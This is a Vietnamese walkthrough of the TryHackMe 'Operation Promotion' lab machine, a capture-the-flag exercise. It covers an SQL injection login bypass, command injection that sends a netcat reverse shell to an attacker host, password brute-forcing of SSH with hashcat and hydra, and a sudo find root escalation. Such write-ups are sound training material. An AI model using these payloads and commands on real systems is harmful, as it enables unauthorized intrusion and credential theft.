# 🛡️ TryHackMe: Operation Promotion - CTF Writeup
Platform: TryHackMe
Room Name: Operation Promotion
Difficulty: Easy
Video Walkthrough: Djalil Ayed - TryHackMe Operation Promotion

# 📋 1. Reconnaissance (Thu thập thông tin)
### 📌 Port Scanning (Nmap)
Đầu tiên, thực hiện quét cổng mục tiêu để xác định các dịch vụ đang chạy trên hệ thống:

Bash
`nmap -sV -sC -T4 <target-ip>`
Kết quả quét thường trả về các cổng chính:

Port 22: OpenSSH (Ubuntu)
Port 80: Apache HTTP Server
Port 139 / 445: SMB (có thể check anonymous/guest share nếu cần)

### 📌 Web Enumeration
Truy cập vào trang web trên Port 80, tiến hành quét thư mục hoặc kiểm tra file `robots.txt` để tìm các đường dẫn bị ẩn.
Phát hiện thư mục ẩn `/admin/` thông qua `robots.txt`.
Tại đây có trang đăng nhập (Admin Login Page) dùng để quản trị hệ thống.

# 🔓 2. Initial Access / Exploitation (Đột nhập ban đầu)
### 📌 Bước 1: SQL Injection (Bypass Authentication)
Form đăng nhập quản trị viên chứa lỗ hổng SQL Injection dạng xác thực cổ điển.

Payload:
SQL
`admin' -- -`
Nhập payload này vào ô Username (hoặc Password) giúp vô hiệu hóa câu lệnh kiểm tra mật khẩu phía sau, cho phép đăng nhập thành công vào giao diện Dashboard (`/admin/dashboard.php`).

### 📌 Bước 2: User Lookup & Information Disclosure
Trong trang Dashboard, tính năng tra cứu người dùng (`admin/users/lookup.php?id=`) cho phép xem thông tin dựa trên ID.

Khi duyệt qua các ID, tìm thấy tài khoản dịch vụ sysmaint ở ID số 7.

Phần ghi chú (Notes) của tài khoản này hé lộ một đường dẫn script bảo trì ẩn: `/admin/sysmaint-checks/ping.php`.

### 📌 Bước 3: Command Injection & Reverse Shell
Truy cập vào endpoint `/admin/sysmaint-checks/ping.php`, trang này yêu cầu tham số host để thực thi lệnh ping. Vì ứng dụng xử lý chuỗi trực tiếp mà không lọc kỹ ký tự đặc biệt, nó dính lỗi OS Command Injection.

Kiểm tra lỗ hổng:

Plaintext
`http://<target-ip>/admin/sysmaint-checks/ping.php?host=127.0.0.1;id`
Trang web trả về kết quả kèm theo thông tin uid=33(www-data).

Lấy Reverse Shell:
Chuẩn bị Netcat listener trên máy tấn công:

Bash
`nc -lvnp 4444`
Gửi payload reverse shell thông qua lệnh Netcat/Bash (hoặc Python/Busybox tùy môi trường) qua tham số host:

Plaintext
http://<target-ip>/admin/sysmaint-checks/ping.php?host=127.0.0.1; nc <attacker-ip> 4444 -e /bin/bash
Kết nối thành công, ta thu được shell dưới quyền người dùng www-data.

# ⚙️ 3. Post-Exploitation & Credential Cracking (Leo thang nội bộ)
### 📌 Đọc Database cục bộ
Sau khi có quyền www-data, tiến hành tìm kiếm các file cấu hình nhạy cảm. Ta tìm thấy cơ sở dữ liệu SQLite tại /var/lib/recruitcorp/app.db.

Sử dụng lệnh sqlite3 để đọc database:

Bash
`sqlite3 /var/lib/recruitcorp/app.db`
Trong bảng chứa thông tin người dùng, ta tìm thấy username jford cùng một đoạn mã hóa mật khẩu dạng Bcrypt hash.

### 📌 Tấn công từ điển (Hashcat Wordlist Generation)
Do không thể brute-force trực tiếp hash Bcrypt một cách nhanh chóng, ta phân tích quy tắc đặt mật khẩu của tổ chức (thường theo dạng cấu trúc đoán trước được như: Mùa + Năm + Ký tự đặc biệt, ví dụ: spring2026!).

Tạo danh sách từ gốc (ví dụ: `spring.txt`).

Sử dụng Hashcat kết hợp với file rule (dive.rule) để đột biến danh sách từ khóa:

Bash
`hashcat --stdout spring.txt -r /usr/local/hashcat/rules/dive.rule > wordlist.txt`
Sử dụng Hydra để tấn công brute-force vào dịch vụ SSH với user jford:

Bash
`hydra -l jford -P wordlist.txt <target-ip> ssh`
Tìm ra mật khẩu chính xác và đăng nhập SSH thành công vào máy chủ dưới quyền user jford.

Thu thập được Flag đầu tiên tại thư mục home của jford.

# 👑 4. Privilege Escalation (Leo thang đặc quyền lên Root)
### 📌 Kiểm tra quyền Sudo
Khi đã đăng nhập SSH thành công bằng tài khoản jford, bước kiểm tra phân quyền quen thuộc là:

Bash
`sudo -l`
Kết quả trả về cho thấy người dùng jford được phép chạy binary find dưới quyền root mà không cần nhập mật khẩu (NOPASSWD: /usr/bin/find).

### 📌 Khai thác GTFOBins (Find Command)
Tra cứu trang GTFOBins cho find, ta thấy có thể lợi dụng tham số -exec của lệnh find để sinh ra một shell có quyền tối cao:

Bash
`sudo find . -exec /bin/bash \; -quit`
Lệnh chạy với quyền root, kích hoạt file thực thi /bin/bash và lập tức cấp cho chúng ta một phiên làm việc (shell) mang quyền root.

Di chuyển đến thư mục gốc (/root) để đọc Root Flag hoàn thành bài thử nghiệm.
